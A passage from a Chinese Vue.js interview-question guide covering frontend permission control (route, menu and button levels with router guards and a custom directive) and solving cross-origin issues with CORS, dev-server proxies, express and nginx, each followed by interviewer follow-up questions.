工具以及代码规范。插件不应为了清单而全装，但路由、状态、接口和质量约束若很快会用到，越晚接入越容易产生结构返工。</p>\\n</li>\\n<li>\\n<p><strong>十人团队提交风格持续冲突，有人只想在 <code>CI</code> 跑 <code>ESLint</code>，有人要求本地提交前拦截，你会怎样组合工具？</strong></p>\\n<p>用 <code>ESLint</code> 负责代码规则、<code>Prettier</code> 负责格式，再由 <code>husky</code> 配合 <code>lint-staged</code> 只检查本次暂存文件，提交信息可交给 <code>commitlint</code>。本地拦截能缩短反馈链路，<code>CI</code> 仍应保留最终校验；规则过重会拖慢提交并诱发绕过。</p>\\n</li>\\n<li>\\n<p><strong>后台切换路由时需要进度提示，几十个页面还频繁复用组合式逻辑，团队却准备各自实现，你会选哪些现成能力？</strong></p>\\n<p>路由进度可使用 <code>nprogress</code>，通用组合式能力优先评估 <code>VueUse</code>，避免每个页面重复维护相似实现。图标若以 <code>SVG</code> 组件方式使用，可配置 <code>vite-svg-loader</code>；每个依赖都应围绕明确需求接入，否则会增加升级和构建配置成本。</p>\\n</li>\\n<li>\\n<p><strong>项目从单体后台变成多个业务域，<code>views</code>、<code>api</code> 和 <code>store</code> 已各有数百个文件，原来的技术分层目录还够用吗？</strong></p>\\n<p>原结构仍可作为顶层职责划分，但业务规模扩大后应在 <code>views</code>、<code>api</code>、<code>store</code> 内继续按领域分组，并保持命名对应。若跨目录修改一个功能需要反复搜索，可考虑强化业务聚合；代价是公共组件与领域私有组件的边界必须重新约定。</p>\\n</li>\\n<li>\\n<p><strong>生产环境出现接口地址错误且路由刷新白屏，新项目搭建阶段应提前为哪些配置留下排查入口？</strong></p>\\n<p>应把环境配置、路由创建、<code>HTTP</code> 实例和构建插件放在职责明确的位置，避免散落在页面组件中。排查时分别核对环境变量与 <code>baseURL</code>、部署服务器的回退规则、路由模式及构建产物路径；仅靠更换 <code>UI</code> 库无法解决这些基础设施故障。</p>\\n</li>\\n<li>\\n<p><strong>两位负责人争论状态管理选 <code>Vuex</code> 还是 <code>Pinia</code>、<code>UI</code> 选 <code>Element Plus</code> 还是 <code>Ant Design Vue</code>，你会在建项会上怎样拍板？</strong></p>\\n<p>这些方案都可作为候选，选择应服从团队熟悉度、现有组件需求和后续维护约束，而不是把个人偏好当结论。先做小范围验证并固定接入边界，再将业务组件封装在库之上；频繁更换基础库的迁移成本通常高于早期细微差异。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_53-vue要做权限管理该怎么做-如果控制到按钮级别的权限怎么做\\"><a class=\\"header-anchor\\" href=\\"#_53-vue要做权限管理该怎么做-如果控制到按钮级别的权限怎么做\\">#</a> 53 vue要做权限管理该怎么做？如果控制到按钮级别的权限怎么做</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>两层：<strong>路由级</strong>（能不能进这个页面）和<strong>元素级</strong>（按钮能不能看见/点）</li>\\n<li>路由级两种方案：<strong>前端配置全量路由 + 按权限过滤</strong>（简单，但路由表在前端可见）；<strong>后端返回路由表 + <code>addRoute</code> 动态注册</strong>（更严谨，适合权限复杂的系统）</li>\\n<li>动态路由的坑：<code>404</code> 通配路由必须<strong>在动态添加之后</strong>再注册，否则会先匹配到它；刷新页面路由会丢，要在守卫里重新注册</li>\\n<li>元素级用自定义指令 <code>v-permission=&quot;\'order:delete\'&quot;</code> 或一个 <code>hasPermission()</code> 方法，权限码从后端拿</li>\\n<li>⚠️ <strong>前端权限只是体验层</strong>，用户完全可以直接调接口 —— 真正的安全边界必须在后端，每个接口都要校验</li>\\n</ul>\\n<p><strong><code>Vue</code> 权限管理要同时控制接口、路由、菜单和按钮，按钮级权限通常封装成自定义指令。</strong> 登录后保存 <code>token</code>，请求拦截器统一携带；遇到失效响应则回到登录页。路由可以在守卫里按角色过滤并通过 <code>addRoute</code> 动态挂载，也可以让后端返回菜单和路由，但后者对前后端字段约定要求更高。按钮使用类似 <code>v-has</code> 的指令比散落的 <code>v-if</code> 更易维护，不过前端控制只能限制界面和请求入口，后台仍需校验权限。</p>\\n</section>\\n<h3 id=\\"是什么\\"><a class=\\"header-anchor\\" href=\\"#是什么\\">#</a> 是什么</h3>\\n<p>权限是对特定资源的访问许可，所谓权限控制，也就是确保用户只能访问到被分配的资源</p>\\n<p>而前端权限归根结底是请求的发起权，请求的发起可能有下面两种形式触发</p>\\n<ul>\\n<li>页面加载触发</li>\\n<li>页面上的按钮点击触发</li>\\n</ul>\\n<p>总的来说，所有的请求发起都触发自前端路由或视图</p>\\n<p>所以我们可以从这两方面入手，对触发权限的源头进行控制，最终要实现的目标是：</p>\\n<ul>\\n<li>路由方面，用户登录后只能看到自己有权访问的导航菜单，也只能访问自己有权访问的路由地址，否则将跳转 <code>4xx</code> 提示页</li>\\n<li>视图方面，用户只能看到自己有权浏览的内容和有权操作的控件</li>\\n<li>最后再加上请求控制作为最后一道防线，路由可能配置失误，按钮可能忘了加权限，这种时候请求控制可以用来兜底，越权请求将在前端被拦截</li>\\n</ul>\\n<h3 id=\\"如何做\\"><a class=\\"header-anchor\\" href=\\"#如何做\\">#</a> 如何做</h3>\\n<p>前端权限控制可以分为四个方面：</p>\\n<ul>\\n<li>接口权限</li>\\n<li>按钮权限</li>\\n<li>菜单权限</li>\\n<li>路由权限</li>\\n</ul>\\n<p><strong>接口权限</strong></p>\\n<p>接口权限目前一般采用<code>jwt</code>的形式来验证，没有通过的话一般返回<code>401</code>，跳转到登录页面重新进行登录</p>\\n<p>登录完拿到<code>token</code>，将<code>token</code>存起来，通过<code>axios</code>请求拦截器进行拦截，每次请求的时候头部携带<code>token</code></p>\\n<pre class=\\"language-js\\"><code>axios.interceptors.request.use(config =&gt; {\\n    config.headers[&#39;token&#39;] = cookie.get(&#39;token&#39;)\\n    return config\\n})\\naxios.interceptors.response.use(res=&gt;{},{response}=&gt;{\\n    if (response.data.code === 40099 || response.data.code === 40098) { //token过期或者错误\\n        router.push(&#39;/login&#39;)\\n    }\\n})\\n</code></pre>\\n<p><strong>路由权限控制</strong></p>\\n<p><strong>方案一</strong></p>\\n<p>初始化即挂载全部路由，并且在路由上标记相应的权限信息，每次路由跳转前做校验</p>\\n<pre class=\\"language-js\\"><code>const routerMap = [\\n  {\\n    path: &#39;/permission&#39;,\\n    component: Layout,\\n    redirect: &#39;/permission/index&#39;,\\n    alwaysShow: true, // will always show the root menu\\n    meta: {\\n      title: &#39;permission&#39;,\\n      icon: &#39;lock&#39;,\\n      roles: [&#39;admin&#39;, &#39;editor&#39;] // you can set roles in root nav\\n    },\\n    children: [{\\n      path: &#39;page&#39;,\\n      component: () =&gt; import(&#39;@/views/permission/page&#39;),\\n      name: &#39;pagePermission&#39;,\\n      meta: {\\n        title: &#39;pagePermission&#39;,\\n        roles: [&#39;admin&#39;] // or you can only set roles in sub nav\\n      }\\n    }, {\\n      path: &#39;directive&#39;,\\n      component: () =&gt; import(&#39;@/views/permission/directive&#39;),\\n      name: &#39;directivePermission&#39;,\\n      meta: {\\n        title: &#39;directivePermission&#39;\\n        // if do not set roles, means: this page does not require permission\\n      }\\n    }]\\n  }]\\n</code></pre>\\n<p>这种方式存在以下四种缺点：</p>\\n<ul>\\n<li>加载所有的路由，如果路由很多，而用户并不是所有的路由都有权限访问，对性能会有影响。</li>\\n<li>全局路由守卫里，每次路由跳转都要做权限判断。</li>\\n<li>菜单信息写死在前端，要改个显示文字或权限信息，需要重新编译</li>\\n<li>菜单跟路由耦合在一起，定义路由的时候还有添加菜单显示标题，图标之类的信息，而且路由不一定作为菜单显示，还要多加字段进行标识</li>\\n</ul>\\n<p><strong>方案二</strong></p>\\n<p>初始化的时候先挂载不需要权限控制的路由，比如登录页，404等错误页。如果用户通过URL进行强制访问，则会直接进入404，相当于从源头上做了控制</p>\\n<p>登录后，获取用户的权限信息，然后筛选有权限访问的路由，在全局路由守卫里进行调用<code>addRoutes</code>添加路由</p>\\n<pre class=\\"language-js\\"><code>import router from &#39;./router&#39;\\nimport store from &#39;./store&#39;\\nimport { Message } from &#39;element-ui&#39;\\nimport NProgress from &#39;nprogress&#39; // progress bar\\nimport &#39;nprogress/nprogress.css&#39;// progress bar style\\nimport { getToken } from &#39;@/utils/auth&#39; // getToken from cookie\\n\\nNProgress.configure({ showSpinner: false })// NProgress Configuration\\n\\n// permission judge function\\nfunction hasPermission(roles, permissionRoles) {\\n  if (roles.indexOf(&#39;admin&#39;) &gt;= 0) return true // admin permission passed directly\\n  if (!permissionRoles) return true\\n  return roles.some(role =&gt; permissionRoles.indexOf(role) &gt;= 0)\\n}\\n\\nconst whiteList = [&#39;/login&#39;, &#39;/authredirect&#39;]// no redirect whitelist\\n\\nrouter.beforeEach((to, from, next) =&gt; {\\n  NProgress.start() // start progress bar\\n  if (getToken()) { // determine if there has token\\n    /* has token*/\\n    if (to.path === &#39;/login&#39;) {\\n      next({ path: &#39;/&#39; })\\n      NProgress.done() // if current page is dashboard will not trigger\\tafterEach hook, so manually handle it\\n    } else {\\n      if (store.getters.roles.length === 0) { // 判断当前用户是否已拉取完user_info信息\\n        store.dispatch(&#39;GetUserInfo&#39;).then(res =&gt; { // 拉取user_info\\n          const roles = res.data.roles // note: roles must be a array! such as: [&#39;editor&#39;,&#39;develop&#39;]\\n          store.dispatch(&#39;GenerateRoutes&#39;, { roles }).then(() =&gt; { // 根据roles权限生成可访问的路由表\\n            router.addRoutes(store.getters.addRouters) // 动态添加可访问路由表\\n            next({ ...to, replace: true }) // hack方法 确保addRoutes已完成 ,set the replace: true so the navigation will not leave a history record\\n          })\\n        }).catch((err) =&gt; {\\n          store.dispatch(&#39;FedLogOut&#39;).then(() =&gt; {\\n            Message.error(err || &#39;Verification failed, please login again&#39;)\\n            next({ path: &#39;/&#39; })\\n          })\\n        })\\n      } else {\\n        // 没有动态改变权限的需求可直接next() 删除下方权限判断 ↓\\n        if (hasPermission(store.getters.roles, to.meta.roles)) {\\n          next()//\\n        } else {\\n          next({ path: &#39;/401&#39;, replace: true, query: { noGoBack: true }})\\n        }\\n        // 可删 ↑\\n      }\\n    }\\n  } else {\\n    /* has no token*/\\n    if (whiteList.indexOf(to.path) !== -1) { // 在免登录白名单，直接进入\\n      next()\\n    } else {\\n      next(&#39;/login&#39;) // 否则全部重定向到登录页\\n      NProgress.done() // if current page is login will not trigger afterEach hook, so manually handle it\\n    }\\n  }\\n})\\n\\nrouter.afterEach(() =&gt; {\\n  NProgress.done() // finish progress bar\\n})\\n</code></pre>\\n<p>按需挂载，路由就需要知道用户的路由权限，也就是在用户登录进来的时候就要知道当前用户拥有哪些路由权限</p>\\n<p>这种方式也存在了以下的缺点：</p>\\n<ul>\\n<li>全局路由守卫里，每次路由跳转都要做判断</li>\\n<li>菜单信息写死在前端，要改个显示文字或权限信息，需要重新编译</li>\\n<li>菜单跟路由耦合在一起，定义路由的时候还有添加菜单显示标题，图标之类的信息，而且路由不一定作为菜单显示，还要多加字段进行标识</li>\\n</ul>\\n<p><strong>菜单权限</strong></p>\\n<p>菜单权限可以理解成将页面与理由进行解耦</p>\\n<p><strong>方案一</strong></p>\\n<p>菜单与路由分离，菜单由后端返回</p>\\n<p>前端定义路由信息</p>\\n<pre class=\\"language-js\\"><code>{\\n    name: &quot;login&quot;,\\n    path: &quot;/login&quot;,\\n    component: () =&gt; import(&quot;@/pages/Login.vue&quot;)\\n}\\n</code></pre>\\n<p><code>name</code>字段都不为空，需要根据此字段与后端返回菜单做关联，后端返回的菜单信息中必须要有<code>name</code>对应的字段，并且做唯一性校验</p>\\n<p>全局路由守卫里做判断</p>\\n<pre class=\\"language-js\\"><code>function hasPermission(router, accessMenu) {\\n  if (whiteList.indexOf(router.path) !== -1) {\\n    return true;\\n  }\\n  let menu = Util.getMenuByName(router.name, accessMenu);\\n  if (menu.name) {\\n    return true;\\n  }\\n  return false;\\n\\n}\\n\\nRouter.beforeEach(async (to, from, next) =&gt; {\\n  if (getToken()) {\\n    let userInfo = store.state.user.userInfo;\\n    if (!userInfo.name) {\\n      try {\\n        await store.dispatch(&quot;GetUserInfo&quot;)\\n        await store.dispatch(&#39;updateAccessMenu&#39;)\\n        if (to.path === &#39;/login&#39;) {\\n          next({ name: &#39;home_index&#39; })\\n        } else {\\n          //Util.toDefaultPage([...routers], to.name, router, next);\\n          next({ ...to, replace: true })//菜单权限更新完成,重新进一次当前路由\\n        }\\n      }  \\n      catch (e) {\\n        if (whiteList.indexOf(to.path) !== -1) { // 在免登录白名单，直接进入\\n          next()\\n        } else {\\n          next(&#39;/login&#39;)\\n        }\\n      }\\n    } else {\\n      if (to.path === &#39;/login&#39;) {\\n        next({ name: &#39;home_index&#39; })\\n      } else {\\n        if (hasPermission(to, store.getters.accessMenu)) {\\n          Util.toDefaultPage(store.getters.accessMenu,to, routes, next);\\n        } else {\\n          next({ path: &#39;/403&#39;,replace:true })\\n        }\\n      }\\n    }\\n  } else {\\n    if (whiteList.indexOf(to.path) !== -1) { // 在免登录白名单，直接进入\\n      next()\\n    } else {\\n      next(&#39;/login&#39;)\\n    }\\n  }\\n  let menu = Util.getMenuByName(to.name, store.getters.accessMenu);\\n  Util.title(menu.title);\\n});\\n\\nRouter.afterEach((to) =&gt; {\\n  window.scrollTo(0, 0);\\n});\\n</code></pre>\\n<p>每次路由跳转的时候都要判断权限，这里的判断也很简单，因为菜单的<code>name</code>与路由的<code>name</code>是一一对应的，而后端返回的菜单就已经是经过权限过滤的</p>\\n<p>如果根据路由<code>name</code>找不到对应的菜单，就表示用户有没权限访问</p>\\n<p>如果路由很多，可以在应用初始化的时候，只挂载不需要权限控制的路由。取得后端返回的菜单后，根据菜单与路由的对应关系，筛选出可访问的路由，通过<code>addRoutes</code>动态挂载</p>\\n<p>这种方式的缺点：</p>\\n<ul>\\n<li>菜单需要与路由做一一对应，前端添加了新功能，需要通过菜单管理功能添加新的菜单，如果菜单配置的不对会导致应用不能正常使用</li>\\n<li>全局路由守卫里，每次路由跳转都要做判断</li>\\n</ul>\\n<p><strong>方案二</strong></p>\\n<p>菜单和路由都由后端返回</p>\\n<p>前端统一定义路由组件</p>\\n<pre class=\\"language-js\\"><code>const Home = () =&gt; import(&quot;../pages/Home.vue&quot;);\\nconst UserInfo = () =&gt; import(&quot;../pages/UserInfo.vue&quot;);\\nexport default {\\n    home: Home,\\n    userInfo: UserInfo\\n};\\n</code></pre>\\n<p>后端路由组件返回以下格式</p>\\n<pre class=\\"language-js\\"><code>[\\n    {\\n        name: &quot;home&quot;,\\n        path: &quot;/&quot;,\\n        component: &quot;home&quot;\\n    },\\n    {\\n        name: &quot;home&quot;,\\n        path: &quot;/userinfo&quot;,\\n        component: &quot;userInfo&quot;\\n    }\\n]\\n</code></pre>\\n<p>在将后端返回路由通过<code>addRoutes</code>动态挂载之间，需要将数据处理一下，将<code>component</code>字段换为真正的组件</p>\\n<p>如果有嵌套路由，后端功能设计的时候，要注意添加相应的字段，前端拿到数据也要做相应的处理</p>\\n<p>这种方法也会存在缺点：</p>\\n<ul>\\n<li>全局路由守卫里，每次路由跳转都要做判断</li>\\n<li>前后端的配合要求更高</li>\\n</ul>\\n<p><strong>按钮权限</strong></p>\\n<p><strong>方案一</strong></p>\\n<p>按钮权限也可以用<code>v-if</code>判断</p>\\n<p>但是如果页面过多，每个页面页面都要获取用户权限<code>role</code>和路由表里的<code>meta.btnPermissions</code>，然后再做判断</p>\\n<p>这种方式就不展开举例了</p>\\n<p><strong>方案二</strong></p>\\n<p>通过自定义指令进行按钮权限的判断</p>\\n<p>首先配置路由</p>\\n<pre class=\\"language-js\\"><code>{\\n    path: &#39;/permission&#39;,\\n    component: Layout,\\n    name: &#39;权限测试&#39;,\\n    meta: {\\n        btnPermissions: [&#39;admin&#39;, &#39;supper&#39;, &#39;normal&#39;]\\n    },\\n    //页面需要的权限\\n    children: [{\\n        path: &#39;supper&#39;,\\n        component: _import(&#39;system/supper&#39;),\\n        name: &#39;权限测试页&#39;,\\n        meta: {\\n            btnPermissions: [&#39;admin&#39;, &#39;supper&#39;]\\n        } //页面需要的权限\\n    },\\n    {\\n        path: &#39;normal&#39;,\\n        component: _import(&#39;system/normal&#39;),\\n        name: &#39;权限测试页&#39;,\\n        meta: {\\n            btnPermissions: [&#39;admin&#39;]\\n        } //页面需要的权限\\n    }]\\n}\\n</code></pre>\\n<p>自定义权限鉴定指令</p>\\n<pre class=\\"language-js\\"><code>import Vue from &#39;vue&#39;\\n/**权限指令**/\\nconst has = Vue.directive(&#39;has&#39;, {\\n    bind: function (el, binding, vnode) {\\n        // 获取页面按钮权限\\n        let btnPermissionsArr = [];\\n        if(binding.value){\\n            // 如果指令传值，获取指令参数，根据指令参数和当前登录人按钮权限做比较。\\n            btnPermissionsArr = Array.of(binding.value);\\n        }else{\\n            // 否则获取路由中的参数，根据路由的btnPermissionsArr和当前登录人按钮权限做比较。\\n            btnPermissionsArr = vnode.context.$route.meta.btnPermissions;\\n        }\\n        if (!Vue.prototype.$_has(btnPermissionsArr)) {\\n            el.parentNode.removeChild(el);\\n        }\\n    }\\n});\\n// 权限检查方法\\nVue.prototype.$_has = function (value) {\\n    let isExist = false;\\n    // 获取用户按钮权限\\n    let btnPermissionsStr = sessionStorage.getItem(&quot;btnPermissions&quot;);\\n    if (btnPermissionsStr == undefined || btnPermissionsStr == null) {\\n        return false;\\n    }\\n    if (value.indexOf(btnPermissionsStr) &gt; -1) {\\n        isExist = true;\\n    }\\n    return isExist;\\n};\\nexport {has}\\n</code></pre>\\n<p>在使用的按钮中只需要引用<code>v-has</code>指令</p>\\n<pre class=\\"language-js\\"><code>&lt;el-button @click=&#39;editClick&#39; type=&quot;primary&quot; v-has&gt;编辑&lt;/el-button&gt;\\n</code></pre>\\n<p><strong>小结</strong></p>\\n<p>关于权限如何选择哪种合适的方案，可以根据自己项目的方案项目，如考虑路由与菜单是否分离</p>\\n<p>权限需要前后端结合，前端尽可能的去控制，更多的需要后台判断</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>后台订单页把无权限的“退款”按钮用 <code>v-if</code> 隐藏后，测试人员仍能直接调用退款接口，这说明前端权限方案哪里有问题？</strong></p>\\n<p>按钮隐藏只控制界面可见性，不能构成安全边界，直接请求接口仍可能绕过前端。后端必须根据当前用户身份和操作权限独立鉴权，前端的 <code>v-if</code> 或自定义指令只负责减少误操作；若接口不校验，菜单和按钮藏得再严也不安全。</p>\\n</li>\\n<li>\\n<p><strong>一个含上百条业务路由的管理后台，产品要求不同角色看到不同页面，你会选择启动时挂载全部路由，还是登录后用 <code>addRoutes</code> 按权限挂载？</strong></p>\\n<p>角色差异较大时更适合登录后获取权限、筛选路由，再通过 <code>addRoutes</code> 动态挂载，未授权地址不会进入业务页面。全部挂载也能依靠路由守卫校验，但会加载和维护用户用不到的路由；两种方案仍都要承担守卫判断及权限配置维护成本。</p>\\n</li>\\n<li>\\n<p><strong>运营要求无需发版就能修改菜单标题和图标，但前端现有路由 <code>meta</code> 同时保存角色、标题与图标，你会怎样调整菜单权限设计？</strong></p>\\n<p>应把菜单展示数据交给后端管理，并用唯一的路由 <code>name</code> 与前端路由建立对应关系，这样标题、图标和可见范围可独立调整。前端仍保留组件和路由定义，并校验返回菜单能否匹配；配置缺失、重名或映射错误会导致入口不可用。</p>\\n</li>\\n<li>\\n<p><strong>用户登录后首次进入 <code>/reports</code> 正常，但刷新就进入 <code>404</code>；日志显示 <code>token</code> 仍在，而内存中的动态路由和 <code>roles</code> 已清空，你会怎样修复导航守卫？</strong></p>\\n<p>守卫发现有 <code>token</code> 但尚未取得 <code>roles</code> 时，应先请求用户信息、生成可访问路由并执行 <code>addRoutes</code>，随后用 <code>next({ ...to, replace: true })</code> 重新进入目标地址。重新导航可让新增路由参与匹配且不增加历史记录；权限拉取失败则应清理登录态并转向登录页。</p>\\n</li>\\n<li>\\n<p><strong>架构评审在“前端维护路由、后端返回菜单”和“菜单路由全部由后端返回”之间争论，组件仍由前端打包时该如何取舍？</strong></p>\\n<p>若希望前端掌握页面结构，可让后端只返回菜单，再以唯一 <code>name</code> 关联路由，边界较清晰但配置必须严格对应。若业务要求后端统一编排菜单和路由，前端需把返回的 <code>component</code> 标识映射为真实组件并处理嵌套结构；这种方案灵活，但前后端契约和校验成本更高。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_54-vue项目中你是如何解决跨域的呢\\"><a class=\\"header-anchor\\" href=\\"#_54-vue项目中你是如何解决跨域的呢\\">#</a> 54 Vue项目中你是如何解决跨域的呢</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>开发环境用 <code>devServer.proxy</code>/<code>Vite</code> 的 <code>server.proxy</code>——本质是本地服务转发，浏览器请求的是同源地址</li>\\n<li>⚠️ <strong>代理配置带不到线上</strong>：打包产物里没有这段逻辑，本地能跑不代表联调没问题</li>\\n<li>生产环境两条路：<strong><code>Nginx</code> 按路径反向代理</strong>让接口和页面同域（推荐，还省掉预检）、或者后端配 <code>CORS</code></li>\\n<li>带 <code>cookie</code> 的跨域请求：<code>Allow-Origin</code> 不能是通配符、要有 <code>Allow-Credentials: true</code>、前端要开 <code>withCredentials</code>，三者缺一不可</li>\\n<li>非简单请求会先发 <code>OPTIONS</code> 预检，服务端要正确响应并配 <code>Access-Control-Max-Age</code> 缓存预检结果</li>\\n</ul>\\n<p><strong><code>Vue</code> 项目开发阶段我一般配置本地代理，生产环境则使用服务端反向代理或由后端开启 <code>CORS</code>。</strong> 跨域本质上是浏览器同源策略的限制，只要协议、主机或端口不同，就可能触发。开发时可在 <code>devServer.proxy</code> 中把 <code>/api</code> 转发到后端，但这段代理只随本地开发服务器工作，不能解决部署后的跨域。线上通常由 <code>Nginx</code> 转发接口请求；如果采用 <code>CORS</code>，后端应明确允许的来源、请求头和方法，并正确响应 <code>OPTIONS</code> 请求。</p>\\n</section>\\n<h3 id=\\"跨域是什么\\"><a class=\\"header-anchor\\" href=\\"#跨域是什么\\">#</a> 跨域是什么</h3>\\n<p>跨域本质是浏览器基于<strong>同源策略</strong>的一种安全手段</p>\\n<p>同源策略（Sameoriginpolicy），是一种约定，它是浏览器最核心也最基本的安全功能</p>\\n<p>所谓同源（即指在同一个域）具有以下三个相同点</p>\\n<ul>\\n<li>协议相同（protocol）</li>\\n<li>主机相同（host）</li>\\n<li>端口相同（port）</li>\\n</ul>\\n<p>反之非同源请求，也就是协议、端口、主机其中一项不相同的时候，这时候就会产生跨域</p>\\n<blockquote>\\n<p>一定要注意跨域是浏览器的限制，你用抓包工具抓取接口数据，是可以看到接口已经把数据返回回来了，只是浏览器的限制，你获取不到数据。用postman请求接口能够请求到数据。这些再次印证了跨域是浏览器的限制。</p>\\n</blockquote>\\n<h3 id=\\"如何解决\\"><a class=\\"header-anchor\\" href=\\"#如何解决\\">#</a> 如何解决</h3>\\n<p>解决跨域的方法有很多，下面列举了三种：</p>\\n<ul>\\n<li>JSONP</li>\\n<li>CORS</li>\\n<li>Proxy</li>\\n</ul>\\n<p>而在<code>vue</code>项目中，我们主要针对<code>CORS</code>或<code>Proxy</code>这两种方案进行展开</p>\\n<p><strong>CORS</strong></p>\\n<p>CORS （Cross-Origin Resource Sharing，跨域资源共享）是一个系统，它由一系列传输的HTTP头组成，这些HTTP头决定浏览器是否阻止前端 JavaScript 代码获取跨域请求的响应</p>\\n<p><code>CORS</code> 实现起来非常方便，只需要增加一些 <code>HTTP</code> 头，让服务器能声明允许的访问来源</p>\\n<p>只要后端实现了 <code>CORS</code>，就实现了跨域</p>\\n<p>!<img src=\\"https://s.poetries.top/uploads/2022/09/ef93fd7632d18368.png\\" alt=\\"\\"></p>\\n<p>以<code>koa</code>框架举例</p>\\n<p>添加中间件，直接设置<code>Access-Control-Allow-Origin</code>响应头</p>\\n<pre class=\\"language-js\\"><code>app.use(async (ctx, next)=&gt; {\\n  ctx.set(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;);\\n  ctx.set(&#39;Access-Control-Allow-Headers&#39;, &#39;Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild&#39;);\\n  ctx.set(&#39;Access-Control-Allow-Methods&#39;, &#39;PUT, POST, GET, DELETE, OPTIONS&#39;);\\n  if (ctx.method == &#39;OPTIONS&#39;) {\\n    ctx.body = 200; \\n  } else {\\n    await next();\\n  }\\n})\\n</code></pre>\\n<p>ps: <code>Access-Control-Allow-Origin</code> 设置为*其实意义不大，可以说是形同虚设，实际应用中，上线前我们会将<code>Access-Control-Allow-Origin</code> 值设为我们目标<code>host</code></p>\\n<p><strong>Proxy</strong></p>\\n<p>代理（Proxy）也称网络代理，是一种特殊的网络服务，允许一个（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击</p>\\n<p><strong>方案一</strong></p>\\n<p>如果是通过<code>vue-cli</code>脚手架工具搭建项目，我们可以通过<code>webpack</code>为我们起一个本地服务器作为请求的代理对象</p>\\n<p>通过该服务器转发请求至目标服务器，得到结果再转发给前端，但是最终发布上线时如果web应用和接口服务器不在一起仍会跨域</p>\\n<p>在<code>vue.config.js</code>文件，新增以下代码</p>\\n<pre class=\\"language-js\\"><code>amodule.exports = {\\n    devServer: {\\n        host: &#39;127.0.0.1&#39;,\\n        port: 8084,\\n        open: true,// vue项目启动时自动打开浏览器\\n        proxy: {\\n            &#39;/api&#39;: { // &#39;/api&#39;是代理标识，用于告诉node，url前面是/api的就是使用代理的\\n                target: &quot;http://xxx.xxx.xx.xx:8080&quot;, //目标地址，一般是指后台服务器地址\\n                changeOrigin: true, //是否跨域\\n                pathRewrite: { // pathRewrite 的作用是把实际Request Url中的&#39;/api&#39;用&quot;&quot;代替\\n                    &#39;^/api&#39;: &quot;&quot; \\n                }\\n            }\\n        }\\n    }\\n}\\n</code></pre>\\n<p>通过<code>axios</code>发送请求中，配置请求的根路径</p>\\n<pre class=\\"language-js\\"><code>axios.defaults.baseURL = &#39;/api&#39;\\n</code></pre>\\n<p><strong>方案二</strong></p>\\n<p>此外，还可通过服务端实现代理请求转发</p>\\n<p>以<code>express</code>框架为例</p>\\n<pre class=\\"language-js\\"><code>var express = require(&#39;express&#39;);\\nconst proxy = require(&#39;http-proxy-middleware&#39;)\\nconst app = express()\\napp.use(express.static(__dirname + &#39;/&#39;))\\napp.use(&#39;/api&#39;, proxy({ target: &#39;http://localhost:4000&#39;, changeOrigin: false\\n                      }));\\nmodule.exports = app\\n</code></pre>\\n<p><strong>方案三</strong></p>\\n<p>通过配置<code>nginx</code>实现代理</p>\\n<pre class=\\"language-js\\"><code>server {\\n    listen    80;\\n    # server_name www.josephxia.com;\\n    location / {\\n        root  /var/www/html;\\n        index  index.html index.htm;\\n        try_files $uri $uri/ /index.html;\\n    }\\n    location /api {\\n        proxy_pass  http://127.0.0.1:3000;\\n        proxy_redirect   off;\\n        proxy_set_header  Host       $host;\\n        proxy_set_header  X-Real-IP     $remote_addr;\\n        proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;\\n    }\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品页从 <code>http://shop.example.com</code> 请求 <code>http://api.example.com/orders</code>，后端已经返回业务数据，但浏览器仍阻止脚本读取响应；仅把请求改成 <code>axios</code> 能解决吗？</strong></p>\\n<p>不能，是否允许脚本读取跨源响应由浏览器依据 <code>CORS</code> 响应头判断，与换用哪种请求库无关。后端需要声明允许的来源、请求头和方法，并正确处理 <code>OPTIONS</code>；生产环境不宜无条件使用 <code>Access-Control-Allow-Origin: *</code>。</p>\\n</li>\\n<li>\\n<p><strong>本地 <code>Vue CLI</code> 项目把接口统一写成 <code>/api/users</code>，实际后端地址没有 <code>/api</code> 前缀，你会怎样配置开发代理？</strong></p>\\n<p>应在 <code>devServer.proxy</code> 中以 <code>/api</code> 为代理标识，将 <code>target</code> 指向后端，并用 <code>pathRewrite</code> 把开头的 <code>/api</code> 替换为空字符串。<code>axios.defaults.baseURL</code> 可设为 <code>/api</code>，让浏览器只访问本地开发服务器；该代理只解决开发期转发，不代表生产部署自动具备同样能力。</p>\\n</li>\\n<li>\\n<p><strong>开发环境依靠 <code>devServer.proxy</code> 一切正常，部署后前端与接口仍位于不同域名，产品认为构建产物会自动保留代理能力，你怎么判断？</strong></p>\\n<p>构建后的静态文件不会继续运行开发服务器代理，因此跨域仍需由后端配置 <code>CORS</code>，或由线上 <code>Nginx</code>、应用服务器提供同源转发。应先确认生产请求地址和部署拓扑，再选择方案；照搬开发配置无法解决浏览器面对真实接口域名时的限制。</p>\\n</li>\\n<li>\\n<p><strong>配置代理后 <code>/api/list</code> 仍由前端开发服务器返回 <code>404</code>，后端访问日志没有请求记录，你会按什么顺序排查？</strong></p>\\n<p>先确认浏览器请求确实以 <code>/api</code> 开头，并检查代理规则、<code>target</code> 和开发服务器是否在改配置后重启。随后核对 <code>pathRewrite</code> 后的真实路径是否符合后端路由；若请求根本未命中代理，调整 <code>CORS</code> 或 <code>changeOrigin</code> 都不会消除这个 <code>404</code>。</p>\\n</li>\\n<li>\\n<p><strong>一个前后端分离系统既能由 <code>Koa</code> 开 <code>CORS</code>，也能让 <code>Nginx</code> 把 <code>/api</code> 转发到 <code>127.0.0.1:3000</code>，上线时怎样取舍？</strong></p>\\n<p>若接口明确允许多个受控站点直接访问，可由服务端维护精确的 <code>CORS</code> 来源、方法和请求头。若希望浏览器始终访问同一站点，可让 